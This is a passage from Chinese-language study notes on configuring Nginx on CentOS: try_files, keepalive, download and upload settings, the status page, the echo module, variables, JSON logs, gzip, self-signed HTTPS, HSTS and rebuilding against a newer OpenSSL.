try_files会按顺序检查文件是否存在，返回第一个找到的文件或文件夹（结尾加斜线表示为文件夹），如果所有文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。只有最后一个参数可以引起
一个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内部500错误。




#2.案例
#2.1创建对应的包
#按$uri  $uri.html $uri/index.html /about/default.html一次访问
[root@centos7 logs]# mkdir /data/nginx/html/pc/about/
[root@centos7 logs]# echo this is default html > /data/nginx/html/pc/about/default.html
[root@centos7 logs]# echo liusenbiao.html >  /data/nginx/html/pc/liusenbiao.html


#2.2修改配置文件
[root@centos7 logs]# vim /apps/nginx/conf.d/pc.conf 
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    error_log /apps/nginx/logs/www.liusenbiao.org_error.log;

    location / {
    root /data/nginx/html/pc/;
    try_files $uri $uri.html $uri/index.html /about/default.html;  #按照指定路径找 www.liusenbiao.org/uri
   }

    location /admin {
    auth_basic      "login password";
    auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
}
```

#### 41.4.11长连接配置

```
#1.概述
keepalive_timeout timeout [header_timeout];  #设定保持连接超时时长，0表示禁止长连接，默认为75s，通常配置在http字段作为站点全局配置
keepalive_requests number;  #在一次长连接上所允许请求的资源的最大数量，默认为100次,建议适当调大,比如:500






#2.修改配置文件
[root@centos7 logs]# vim /apps/nginx/conf.d/pc.conf 
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    error_log /apps/nginx/logs/www.liusenbiao.org_error.log;
  keepalive_timeout 80 60;   #修改
  keepalive_requests 3; #修改
    location / {
    root /data/nginx/html/pc/;
    try_files $uri $uri.html $uri/index.html /about/default.html;  #按照指定路径找 www.liusenbiao.org/uri
   }

    location /admin {
    auth_basic      "login password";
    auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
}





#3.使用命令测试
keepalive_requests 3;
keepalive_timeout  65 60; #开启长连接后，真正实际的时间65秒就会被断，客户看到的时间60s
Keep-Alive:timeout=60  #浏览器收到的服务器返回的报文

#如果设置为0表示关闭会话保持功能，将如下显示：
Connection:close  #浏览器收到的服务器返回的报文

[root@centos8 ~]# telnet www.liusenbiao.org 80
Trying 10.0.0.8...
Connected to www.liusenbiao.org.
Escape character is '^]'.
GET / HTTP/1.1
HOST: www.liusenbiao.org
#Response Headers(响应头信息)：
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 24 Sep 2020 04:35:35 GMT
Content-Type: text/html
Content-Length: 7
Last-Modified: Wed, 23 Sep 2020 14:39:21 GMT
Connection: keep-alive
Keep-Alive: timeout=60
ETag: "5c8a6b3a-7"
Accept-Ranges: bytes
#页面内容
pc web
```

#### 41.4.12作为下载服务器配置

```
#1.对应模块系统自带
ngx_http_autoindex_module 模块处理以斜杠字符 "/" 结尾的请求，并生成目录列表,可以做为下载服务配置使用




#2.相关指令:
autoindex on | off;#自动文件索引功能，默为off
autoindex_exact_size on | off;  #计算文件确切大小（单位bytes），off 显示大概大小（单位K、M)，默认on
autoindex_localtime on | off ; #显示本机时间而非GMT(格林威治)时间，默认off
autoindex_format html | xml | json | jsonp; #显示索引的页面文件风格，默认html
limit_rate rate; #限制响应客户端传输速率(除GET和HEAD以外的所有方法)，单位B/s,即
bytes/second，默认值0,表示无限制,此指令由ngx_http_core_module提供





#3.案例：实现下载站点

#3.1修改配置文件
[root@centos7 logs]# vim /apps/nginx/conf.d/pc.conf 
server {
    listen 80;
    server_name www.liusenbiao.org;
    root /data/nginx/html/pc/;
    error_log /apps/nginx/logs/www.liusenbiao.org_error.log;

    location / {
    root /data/nginx/html/pc/;
    try_files $uri $uri.html $uri/index.html /about/default.html;
   }

    location /admin {
    auth_basic      "login password";
    auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
    location /download {
     autoindex on;
     autoindex_exact_size   on;
     autoindex_localtime   off;
     alias /opt/download;  #定义下载路径
   }
}


	
#3.创建对应的下载目录
[root@centos7 logs]# mkdir /opt/download
[root@centos7 logs]# cd /opt/download/
把你要显示的文件拖进来
```

![1656072462721](linux体系.assets/1656072462721.png)

![1656072518366](linux体系.assets/1656072518366.png)

#### 41.4.13作为上传服务器

```
#1.以下指令控制上传数据
client_max_body_size 1m; #设置允许客户端上传单个文件的最大值，默认值为1m,上传文件超过此值会出413错误
client_body_buffer_size size; #用于接收每个客户端请求报文的body部分的缓冲区大小;默认16k;超出此大小时，其将被暂存到磁盘上的由下面client_body_temp_path指令所定义的位置
client_body_temp_path path [level1 [level2 [level3]]];
#设定存储客户端请求报文的body部分的临时存储路径及子目录结构和数量，目录名为16进制的数字，使用hash之后的值从后往前截取1位、2位、2位作为目录名
[root@centos8 ~]# md5sum /data/nginx/html/pc/index.html 
95f6f65f498c74938064851b1bb 96 3d 4 /data/nginx/html/pc/index.html
1级目录占1位16进制，即2^4=16个目录  0-f
2级目录占2位16进制，即2^8=256个目录 00-ff
3级目录占2位16进制，即2^8=256个目录 00-ff



#2.配置示例：
client_max_body_size 100m; #如果太大，上传时会出现下图的413错误,注意:如果php上传,还需要修改php.ini的相关配置
client_body_buffer_size 1024k;
client_body_temp_path   /apps/nginx/client_body_temp/ 1 2 2; #上传时,Nginx会自动创建相关目录
```

#### 41.4.14其他配置

```
#1.limit_except method ... { ... }，只能放在location语句块里面
#限制客户端使用除了指定的请求方法之外的其它方法 
method:GET, HEAD, POST, PUT, DELETE，MKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH
limit_except GET {
#除了192.168.0.0/24和10.0.0.1两个网段，其他机器是不能执行GET以外的方法的
 allow 192.168.0.0/24;
 allow 10.0.0.1;
 deny all;
}



#2.除了GET和HEAD 之外其它方法仅允许192.168.1.0/24网段主机使用
[root@centos8 ~]# mkdir /data/nginx/html/pc/upload
[root@centos8 ~]# echo "upload" > /data/nginx/html/pc/upload/index.html
[root@centos8 ~]# vim /apps/nginx/conf/conf.d/pc.conf
location /upload {
       root /data/nginx/html/pc;
       index index.html;
       limit_except GET {
           allow  10.0.0.6;
           deny all;
       }
}




#3.重启Nginx并进行测试上传文件
[root@centos8 ~]# systemctl restart nginx
[root@centos8 ~]# 
[root@centos6 ~]# curl -XPUT /etc/issue http://www.magedu.org/about
curl: (3) <url> malformed
<html>
<head><title>405 Not Allowed</title></head> #Nginx已经允许,但是程序未支持上传功能





#4.aio on | off  #是否启用asynchronous file I/O(AIO)功能，需要编译开启 --with-file-aio
#linux 2.6以上内核提供以下几个系统调用来支持aio： 
1、SYS_io_setup：建立aio 的context
2、SYS_io_submit: 提交I/O操作请求
3、SYS_io_getevents：获取已完成的I/O事件
4、SYS_io_cancel：取消I/O操作请求
5、SYS_io_destroy：毁销aio的context






#5.open_file_cache off;  #是否缓存打开过的文件信息
open_file_cache max=N [inactive=time];
#nginx可以缓存以下三种信息：
(1) 文件元数据：文件的描述符、文件大小和最近一次的修改时间
(2) 打开的目录结构
(3) 没有找到的或者没有权限访问的文件的相关信息 
max=N：#可缓存的缓存项上限数量;达到上限后会使用LRU(Least recently used，最近最少使用)算法实现管理
inactive=time：#缓存项的非活动时长，在此处指定的时长内未被命中的或命中的次数少于
open_file_cache_min_uses指令所指定的次数的缓存项即为非活动项，将被删除 
open_file_cache_valid time; #缓存项有效性的检查验证频率，默认值为60s 
open_file_cache_errors on | off; #是否缓存查找时发生错误的文件一类的信息,默认值为off
open_file_cache_min_uses number; #open_file_cache指令的inactive参数指定的时长内，至少被命中此处指定的次数方可被归类为活动项,默认值为1




#5.1案例
open_file_cache max=10000 inactive=60s; #最大缓存10000个文件，非活动数据超时时长60s
open_file_cache_valid   60s;  #每间隔60s检查一下缓存数据有效性
open_file_cache_min_uses 5; #60秒内至少被命中访问5次才被标记为活动数据
open_file_cache_errors   on; #缓存错误信息
```

### 41.5Nginx高级配置

#### 41.5.1Nginx状态页

```
#1.状态页概述
基于nginx 模块 ngx_http_stub_status_module 实现，在编译安装nginx的时候需要添加编译参数 --with-http_stub_status_module，否则配置完成之后监测会是提示语法错误
注意: 状态页显示的是整个服务器的状态,而非虚拟主机的状态





#2.status详解：
Active connections： #当前处于活动状态的客户端连接数，包括连接等待空闲连接数=reading+writing+waiting
accepts：#统计总值，Nginx自启动后已经接受的客户端请求的总数。
handled：#统计总值，Nginx自启动后已经处理完成的客户端请求总数，通常等于accepts，除非有因worker_connections限制等被拒绝的连接
requests：#统计总值，Nginx自启动后客户端发来的总的请求数。
Reading：#当前状态，正在读取客户端请求报文首部的连接的连接数,数值越大,说明排队现象严重,性能不足
Writing：#当前状态，正在向客户端发送响应报文过程中的连接数,数值越大,说明访问量很大
Waiting：#当前状态，正在等待客户端发出请求的空闲连接数，开启 keep-alive的情况下,这个值等于active – (reading+writing)




#3.配置示例：
location /status {
   stub_status;     #开启这个
   auth_basic           "auth login";
   auth_basic_user_file /apps/nginx/conf/.htpasswd;
   allow 192.168.0.0/16;
   allow 127.0.0.1;
   deny all;
 }
 
 
 
#4.分析网站当前访问量
[root@centos7 ~]#curl http://liu:123456@www.liusenbiao.com/nginx_status 2 > /dev/null |awk '/Reading/{print $2,$4,$6}'
0 1 1
```

#### 41.5.2Nginx第三方模块

```
#1.概述
第三模块是对nginx 的功能扩展，第三方模块需要在编译安装Nginx 的时候使用参数--add-module=PATH指定路径添加，有的模块是由公司的开发人员针对业务需求定制开发的，有的模块是开源爱好者开发好之后上传到github进行开源的模块，nginx支持第三方模块需要从源码重新编译支持，比如:开源的echo模块 https://github.com/openresty/echo-nginx-module





#2.配置nginx子配置文件
[root@centos7 nginx-1.20.1]# vim /apps/nginx/conf.d/pc.conf
server {
    listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;
      error_log /apps/nginx/logs/www.liusenbiao.org_error.log;

    location / {
      root /data/nginx/html/pc/;
      try_files $uri $uri.html $uri/index.html /about/default.html;
   }
    location /ip {
      default_type text/html;  #访问的文件类型
      echo "Welcome,your ip addr: "; #你要输出的内容
      echo $remote_addr;   #你的ip地址
   }

      location /status {
      stub_status;
   }

      location /admin {
      auth_basic      "login password";
      auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
      location /download {
       autoindex on;
       autoindex_exact_size  off;
       autoindex_localtime   on;
       alias /opt/download;
   }
}





#3.下载echo源码并编译安装
[root@centos7 ~]# yum -y install git
[root@centos7 ~]# cd /usr/local/src/
[root@centos7 src]# git clone https://github.com/openresty/echo-nginx-module.git
[root@centos7 echo-nginx-module]# cd /usr/local/src/nginx-1.20.1
[root@centos7 nginx-1.20.1]# nginx -V
#添加第三方模块
[root@centos7 nginx-1.20.1]# ./configure 
--prefix=/apps/nginx/
--user=nginx --group=nginx
--with-http_ssl_module
--with-http_v2_module
--with-http_realip_module
--with-http_stub_status_module
--with-http_gzip_static_module
--with-pcre --with-stream
--with-stream_ssl_module
--with-stream_realip_module
--add-module=/usr/local/src/echo-nginx-module #添加第三方模块
[root@centos7 nginx-1.20.1]# make -j 4 && make install
[root@centos7 ~]# ll /apps/nginx/sbin/nginx*
-rwxr-xr-x 1 root root 8528824 Jun 24 22:49 /apps/nginx/sbin/nginx
-rwxr-xr-x 1 root root 7893544 Jun 23 21:01 /apps/nginx/sbin/nginx.old
[root@centos7 nginx-1.20.1]# nginx -s quit
[root@centos7 nginx-1.20.1]# nginx

```

![1656082447758](linux体系.assets/1656082447758.png)

#### 41.5.3Nginx变量使用

##### 41.5.3.1内置变量

```
#1.变量的概述
nginx的变量可以在配置文件中引用，作为功能判断或者日志等场景使用
变量可以分为内置变量和自定义变量
内置变量是由nginx模块自带，通过变量可以获取到众多的与客户端访问相关的值。




#2.常用的内置变量
$remote_addr; 
#存放了客户端的地址，注意是客户端的公网IP

$proxy_add_x_forwarded_for
#看到真实客户端的来源地址

$args; 
#变量中存放了URL中的参数，例如:http://www.magedu.org/main/index.do?
id=20190221&partner=search
#返回结果为: id=20190221&partner=search

$document_root; 
#保存了针对当前资源的请求的系统根目录,例如:/apps/nginx/html。

$document_uri;
#保存了当前请求中不包含参数的URI，注意是不包含请求的指令，比如:http://www.magedu.org/main/index.do?id=20190221&partner=search会被定义为/main/index.do 
#返回结果为:/main/index.do

$host; 
#存放了请求的host名称

limit_rate 10240;
echo $limit_rate;
#如果nginx服务器使用limit_rate配置了显示网络速率，则会显示，如果没有设置， 则显示0

$remote_port;
#客户端请求Nginx服务器时随机打开的端口，这是每个客户端自己的端口

$remote_user;
#已经经过Auth Basic Module验证的用户名

$request_body_file; 
#做反向代理时发给后端服务器的本地资源的名称

$request_method; 
#请求资源的方式，GET/PUT/DELETE等

$request_filename; 
#当前请求的资源文件的磁盘路径，由root或alias指令与URI请求生成的文件绝对路径，
如:/apps/nginx/html/main/index.html

$request_uri;
#包含请求参数的原始URI，不包含主机名，相当于:$document_uri?$args,例如：/main/index.do?
id=20190221&partner=search 

$scheme;
#请求的协议，例如:http，https,ftp等

$server_protocol;
#保存了客户端请求资源使用的协议的版本，例如:HTTP/1.0，HTTP/1.1，HTTP/2.0等

$server_addr;
#保存了服务器的IP地址

$server_name;
#请求的服务器的主机名

$server_port;
#请求的服务器的端口号

$http_<name>
#name为任意请求报文首部字段,表示记录请求报文的首部字段
arbitrary request header field; the last part of a variable name is the field name converted to lower case with dashes replaced by underscores  #用下划线代替横线
#示例: echo $http_User_Agent;  

$http_user_agent; #客户端浏览器的详细信息

$http_cookie; 
#客户端的cookie信息

$cookie_<name>
#name为任意请求报文首部字部cookie的key名




#3.案例
[root@centos8 ~]#vim /apps/nginx/conf/conf.d/pc.conf
    location /var {
     index index.html;
     default_type text/html;
     echo "hello world,main-->";
     echo $remote_addr;
     echo $args;
     echo $document_root;
     echo $document_uri;
     echo $host;
     echo $http_user_agent;
     echo $http_cookie
     echo $request_filename;
     echo $scheme;
     echo $scheme://$host$document_uri?$args;
  }
```

![1656121556955](linux体系.assets/1656121556955.png)

##### 41.5.3.2自定义变量

```
location /var {
set $name liusenbiao;
echo $name;
set $my_port $server_port;  #系统自带变量给自定义变量赋值
echo $my_port;
echo "$server_name:$server_port";
}

[root@centos6 ~]#curl www.liusenbiao.org/main
liusenbiao
80
www.liusenbiao.org:80
```

#### 41.5.4Nginx自定义访问日志

##### 41.5.4.1自定义默认格式日志

```
#1.1修改主配置文件nginx.conf
[root@centos7 ~]# vim /apps/nginx/conf/nginx.conf  
#格式要放在include       /apps/nginx/conf.d/*.conf;的上面，不然会产生bug
    log_format nginx_format1  '$remote_addr - $remote_user [$time_local] "$request" '
                              '$status $body_bytes_sent "$http_referer" '
                             '"$http_user_agent" "$http_x_forwarded_for"'
                              '$server_name:$server_port';
    
 



#1.2修改子配置文件pc.conf
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
server {
    listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;
      error_log /apps/nginx/logs/www.liusenbiao.org_error.log;
      access_log /apps/nginx/logs/www.liusenbiao.org_access.log nginx_format1;  #定义在这里
}
[root@centos7 ~]# nginx -t
[root@centos7 ~]# nginx -s reload
```

##### 41.5.4.2自定义json格式日志

```
#1.概述
Nginx的默认访问日志记录内容相对比较单一，默认的格式也不方便后期做日志统计分析，生产环境中通常将nginx日志转换为json日志，然后配合使用ELK做日志收集-统计-分析。



#2.案例

#2.1修改主配置文件nginx.conf
[root@centos7 ~]# vim /apps/nginx/conf/nginx.conf
http {
    include       mime.types;
    log_format access_json '{"@timestamp":"$time_iso8601",'
        '"host":"$server_addr",'
        '"clientip":"$remote_addr",'
        '"size":$body_bytes_sent,'
        '"responsetime":$request_time,'
        '"upstreamtime":"$upstream_response_time",'
        '"upstreamhost":"$upstream_addr",'
        '"http_host":"$host",'
        '"uri":"$uri",'
        '"xff":"$http_x_forwarded_for",'
        '"referer":"$http_referer",'
        '"tcp_xff":"$proxy_protocol_addr",'
        '"http_user_agent":"$http_user_agent",'
        '"status":"$status"}';
        
    include       /apps/nginx/conf.d/*.conf; #json定义在此上面
}




#2.2修改子配置文件pc.conf
[root@centos7 ~]# vim /apps/nginx/conf.d/pc.conf
server {
    listen 80;
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;
      error_log /apps/nginx/logs/www.liusenbiao.org_error.log;
      access_log /apps/nginx/logs/www.liusenbiao.org_access.log access_json;  #要和主配置文件定义的access_json相匹配





#3.测试
[root@centos7 ~]# tail -f /apps/nginx/logs/www.liusenbiao.org_access.log
```

![1656129500074](linux体系.assets/1656129500074.png)

#### 41.5.5Nginx压缩功能

```
#1.概述
Nginx支持对指定类型的文件进行压缩然后再传输给客户端，而且压缩还可以设置压缩比例，压缩后的文件大小将比源文件显著变小，这样有助于降低出口带宽的利用率，降低企业的IT支出，不过会占用相
应的CPU资源。
Nginx对文件的压缩功能是依赖于模块 ngx_http_gzip_module
官方文档： https://nginx.org/en/docs/http/ngx_http_gzip_module.html





#2.配置指令如下：
#启用或禁用gzip压缩，默认关闭
gzip on | off; 

#压缩比由低到高从1到9，默认为1
gzip_comp_level level;

#禁用IE6 gzip功能
gzip_disable "MSIE [1-6]\."; 

#gzip压缩的最小文件，小于设置值的文件将不会压缩
gzip_min_length 1k; 

#启用压缩功能时，协议的最小版本，默认HTTP/1.1
gzip_http_version 1.0 | 1.1; 

#指定Nginx服务需要向服务器申请的缓存空间的个数和大小,平台不同,默认:32 4k或者16 8k;
gzip_buffers number size;  

#指明仅对哪些类型的资源执行压缩操作;默认为gzip_types text/html，不用显示指定，否则出错
gzip_types mime-type ...; 

#如果启用压缩，是否在响应报文首部插入“Vary: Accept-Encoding”,一般建议打开
gzip_vary on | off; 





#3.案例：
#重启nginx并进行访问测试压缩功能
[root@centos8 ~]# cp /apps/nginx/logs/access.log /data/nginx/html/pc/m.txt
[root@centos8 ~]# echo "test" > /data/nginx/html/pc/test.html #小于1k的文件测试是否会压缩
[root@centos7 pc]# vim /apps/nginx/conf.d/pc.conf
gzip on;
gzip_comp_level 5;
gzip_min_length 1k;
gzip_types text/plain application/javascript application/x-javascript text/css 
application/xml text/javascript application/x-httpd-php image/gif image/png;   
gzip_vary on;
```

#### 41.5.6https功能

![1656152647510](linux体系.assets/1656152647510.png)

```
https 实现过程如下：
1.客户端发起HTTPS请求：
客户端访问某个web端的https地址，一般都是443端口

2.服务端的配置：
采用https协议的服务器必须要有一套证书，可以通过一些组织申请，也可以自己制作，目前国内很多网站都自己做的，当你访问一个网站的时候提示证书不可信任就表示证书是自己做的，证书就是一个公钥和私钥匙，就像一把锁和钥匙，正常情况下只有你的钥匙可以打开你的锁，你可以把这个送给别人让他锁住一个箱子，里面放满了钱或秘密，别人不知道里面放了什么而且别人也打不开，只有你的钥匙是可以打开的。

3.传送证书：
服务端给客户端传递证书，其实就是公钥，里面包含了很多信息，例如证书得到颁发机构、过期时间等等。

4.客户端解析证书：
这部分工作是有客户端完成的，首先回验证公钥的有效性，比如颁发机构、过期时间等等，如果发现异常则会弹出一个警告框提示证书可能存在问题，如果证书没有问题就生成一个随机值，然后用证书对该随机值进行加密，就像2步骤所说把随机值锁起来，不让别人看到。

5.传送4步骤的加密数据：
就是将用证书加密后的随机值传递给服务器，目的就是为了让服务器得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值进行加密解密了。

6.服务端解密信息：
服务端用私钥解密5步骤加密后的随机值之后，得到了客户端传过来的随机值(私钥)，然后把内容通过该值进行对称加密，对称加密就是将信息和私钥通过算法混合在一起，这样除非你知道私钥，不然是无法获取其内部的内容，而正好客户端和服务端都知道这个私钥，所以只要机密算法够复杂就可以保证数据的安全性。

7.传输加密后的信息:
服务端将用私钥加密后的数据传递给客户端，在客户端可以被还原出原数据内容。

8.客户端解密信息：
客户端用之前生成的私钥获解密服务端传递过来的数据，由于数据一直是加密的，因此即使第三方获取到数据也无法知道其详细内容。
```

##### 41.5.6.1https 配置参数

```
listen 443 ssl;
#为指定的虚拟主机配置是否启用ssl功能，此功能在1.15.0废弃，使用listen [ssl]替代

ssl_certificate /path/to/file;
#指向包含当前虚拟主机和CA的两个证书信息的文件，一般是crt文件

ssl_certificate_key /path/to/file;
#当前虚拟主机使用的私钥文件，一般是key文件

ssl_protocols [SSLv2] [SSLv3] [TLSv1] [TLSv1.1] [TLSv1.2]; 
#支持ssl协议版本，早期为ssl现在是TLS，默认为后三个

ssl_session_cache off | none | [builtin[:size]] [shared:name:size];
#配置ssl缓存
   off： #关闭缓存
 none:  #通知客户端支持ssl session cache，但实际不支持
 builtin[:size]：#使用OpenSSL内建缓存，为每worker进程私有
 [shared:name:size]：#在各worker之间使用一个共享的缓存，需要定义一个缓存名称和缓存空间大小，一兆可以存储4000个会话信息，多个虚拟主机可以使用相同的缓存名称

ssl_session_timeout time;
#客户端连接可以复用ssl session cache中缓存的有效时长，默认5m
```

##### 41.5.6.2 自签名证书

```
#1.创建ssl文件夹
[root@centos7 pc]# cd  /apps/nginx/conf.d/
[root@centos7 conf.d]# mkdir ssl
[root@centos7 conf.d]# cd ssl





#2.一键创建证书脚本
[root@centos7 ssl]# vim certificate.sh
#!/bin/bash
#
#********************************************************************
#FileName：             certificate.sh
#URL:                   http://www.liwenliang.org
#Copyright (C):         2020 All rights reserved
#********************************************************************
CA_SUBJECT="/O=liusenbiao/CN=ca.liusenbiao.org"
SUBJECT="/C=CN/ST=henan/L=zhengzhou/O=liusenbiao/CN=www.liusenbiao.org"
SERIAL=34
EXPIRE=202002
FILE=liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key






#3.将服务器证书和ca证书整合在一起
[root@centos7 ssl]# bash certificate.sh
[root@centos7 ssl]# ls
ca.crt  certificate.sh      liusenbiao.org.csr
ca.key  liusenbiao.org.crt  liusenbiao.org.key
[root@centos7 ssl]# cat liusenbiao.org.crt ca.crt > www.liusenbiao.org.crt
[root@centos7 ssl]# mv liusenbiao.org.key www.liusenbiao.org.key
[root@centos7 ssl]# ll www.liusenbiao.org.*
-rw-r--r-- 1 root root 2275 Jun 26 03:36 www.liusenbiao.org.crt
-rw------- 1 root root 1704 Jun 26 03:28 www.liusenbiao.org.key






#4.修改子配置文件
server {
      listen 80;
      listen 443 ssl;
      ssl_certificate /apps/nginx/conf.d/ssl/www.liusenbiao.org.crt;
      ssl_certificate_key /apps/nginx/conf.d/ssl/www.liusenbiao.org.key;
      ssl_session_cache shared:sslcache:20m;
      ssl_session_timeout 10m;
}
[root@centos7 ssl]# nginx -t
nginx: the configuration file /apps/nginx//conf/nginx.conf syntax is ok
nginx: configuration file /apps/nginx//conf/nginx.conf test is successful
[root@centos7 ssl]# nginx -s reload
```

![1656160427908](linux体系.assets/1656160427908.png)

![1656161075310](linux体系.assets/1656161075310.png)

##### 41.5.6.3实现多域名https

```
#1.概述
Nginx 支持基于单个IP实现多域名的功能，并且还支持单IP多域名的基础之上实现HTTPS，其实是基于Nginx的SNI（Server Name Indication）功能实现，SNI是为了解决一个Nginx服务器内使用一个IP绑定多个域名和证书的功能，其具体功能是客户端在连接到服务器建立SSL链接之前先发送要访问站点的域名（Hostname），这样服务器再根据这个域名返回给客户端一个合适的证书。





#2.案例：

#2.1创建对应的证书
[root@centos7 pc]# cd  /apps/nginx/conf.d/ssl
[root@centos7 ssl]# vim certificate.sh
#!/bin/bash
#
#********************************************************************
#FileName：             certificate.sh
#URL:                   http://www.liwenliang.org
#Copyright (C):         2020 All rights reserved
#********************************************************************
CA_SUBJECT="/O=magedu/CN=ca.liusenbiao.org"
SUBJECT="/C=CN/ST=henan/L=zhengzhou/O=liusenbiao/CN=m.liusenbiao.org"
SERIAL=34
EXPIRE=202002
FILE=m.liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key

[root@centos7 ssl]# bash certificate.sh


#2.2证书合并在一起
[root@centos7 ssl]# cat m.liusenbiao.org.crt ca.crt > m.liusenbiao.org.pem
[root@centos7 ssl]# ll
total 36
-rw-r--r-- 1 root root 1176 Jun 26 05:00 ca.crt
-rw------- 1 root root 1704 Jun 26 05:00 ca.key
-rw-r--r-- 1 root root  759 Jun 26 05:00 certificate.sh
-rw-r--r-- 1 root root 1111 Jun 26 05:00 m.liusenbiao.org.crt
-rw-r--r-- 1 root root  997 Jun 26 05:00 m.liusenbiao.org.csr
-rw------- 1 root root 1704 Jun 26 05:00 m.liusenbiao.org.key
-rw-r--r-- 1 root root 2287 Jun 26 05:02 m.liusenbiao.org.pem
-rw-r--r-- 1 root root 2275 Jun 26 03:36 www.liusenbiao.org.crt
-rw------- 1 root root 1704 Jun 26 03:28 www.liusenbiao.org.key



#2.3修改mobile.conf
[root@centos7 conf.d]# nginx -t
nginx: the configuration file /apps/nginx//conf/nginx.conf syntax is ok
nginx: configuration file /apps/nginx//conf/nginx.conf test is successful
[root@centos7 conf.d]# nginx -s reload
```

![1656162466435](linux体系.assets/1656162466435.png)

![1656162476982](linux体系.assets/1656162476982.png)

![1656162495931](linux体系.assets/1656162495931.png)

##### 41.5.6.4实现HSTS

```
#1.概述
注意: 配置rewrite才能实现http跳转到https



#2.案例：
[root@centos7 conf.d]# vim /apps/nginx/conf.d/pc.conf
server {
      listen 80;
      listen 443 ssl;
      ssl_certificate /apps/nginx/conf.d/ssl/www.liusenbiao.org.crt;
      ssl_certificate_key /apps/nginx/conf.d/ssl/www.liusenbiao.org.key;
      ssl_session_cache shared:sslcache:20m;
      ssl_session_timeout 10m;
      add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";  #加这行表示浏览器里面存一年
      server_name www.liusenbiao.org;
      root /data/nginx/html/pc/;
      error_log /apps/nginx/logs/www.liusenbiao.org_error.log;
      access_log /apps/nginx/logs/www.liusenbiao.org_access.log access_json;

    location / {
      root /data/nginx/html/pc/;
       if ( $scheme = http ) {
          rewrite ^/(.*)$ https://www.liusenbiao.org/$1 redirect; #加这行，表示如果访问http,自动跳转到https
       }
      try_files $uri $uri.html $uri/index.html /about/default.html;
   }
    location /ip {
      default_type text/html;
      echo "Welcome,your ip addr: ";
      echo $remote_addr;
   }

      location /status {
      stub_status;
   }

      location /admin {
      auth_basic      "login password";
      auth_basic_user_file /apps/nginx/conf.d/.htpasswd;
  }
      location /download {
       autoindex on;
       autoindex_exact_size  off;
       autoindex_localtime   on;
       alias /opt/download;
   }
    location /var {
     index index.html;
     default_type text/html;
     echo "hello world,main-->";
     echo $remote_addr;
     echo $args;
     echo $document_root;
     echo $document_uri;
     echo $host;
     echo $http_user_agent;
     echo $http_cookie
     echo $request_filename;
     echo $scheme;
     echo $scheme://$host$document_uri?$args;
   }
}
[root@centos7 conf.d]# nginx -s reload
```

![1656163426743](linux体系.assets/1656163426743.png)

![1656163397913](linux体系.assets/1656163397913.png)

#### 41.5.7关于favicon.ico

```
#1.概述
favicon.ico 文件是浏览器收藏网址时显示的图标，当客户端使用浏览器问页面时，浏览器会自己主动发起请求获取页面的favicon.ico文件，但是当浏览器请求的favicon.ico文件不存在时，服务器会记录404日志，而且浏览器也会显示404报错



#2.案例
[root@centos7 conf.d]# wegt www.jd.com/favicon.ico #下载京东的logo图片
[root@centos7 conf.d]# mv favicon.ico /data/nginx/html/pc/
[root@centos7 ~]# cd /apps/nginx/conf.d/
[root@centos7 conf.d]# vim pc.conf
location / {
      root /data/nginx/html/pc/;   #加上这行
       if ( $scheme = http ) {
          rewrite ^/(.*)$ https://www.liusenbiao.org/$1 redirect;
       }
      try_files $uri $uri.html $uri/index.html /about/default.html;
   }
```

![1656164116248](linux体系.assets/1656164116248.png)

#### 41.5.8升级OpenSSL版本

```
#1.下载openssl的源码包
[root@centos7 ~]# wget https://www.openssl.org/source/openssl-1.1.1k.tar.gz --no-check-certificate
[root@centos7 ~]# mv openssl-1.1.1k.tar.gz /usr/local/src/
[root@centos7 ~]# cd /usr/local/src/
[root@centos7 src]# tar xf openssl-1.1.1k.tar.gz




#2.nginx重新进行编译
[root@centos7 src]# cd nginx-1.20.1
[root@centos7 nginx-1.20.1]# ./configure --help | grep openssl
  --with-openssl=DIR                 set path to OpenSSL library sources
  --with-openssl-opt=OPTIONS         set additional build options for OpenSSL
[root@centos7 nginx-1.20.1]# ./configure 
--prefix=/apps/nginx/
--user=nginx
--group=nginx
--with-http_ssl_module
--with-http_v2_module
--with-http_realip_module
--with-http_stub_status_module
--with-http_gzip_static_module
--with-pcre --with-stream
--with-stream_ssl_module
--with-stream_realip_module
--add-module=/usr/local/src/echo-nginx-module/
--with-openssl=/usr/local/src/openssl-1.1.1k    #添加上这行
[root@centos7 nginx-1.20.1]# make -j 4 && make install
```

![1656165518116](linux体系.assets/1656165518116.png)

### 41.6Nginx Rewrite功能

#### 41.6.1rewrite_module模块指令

```
#1.概述
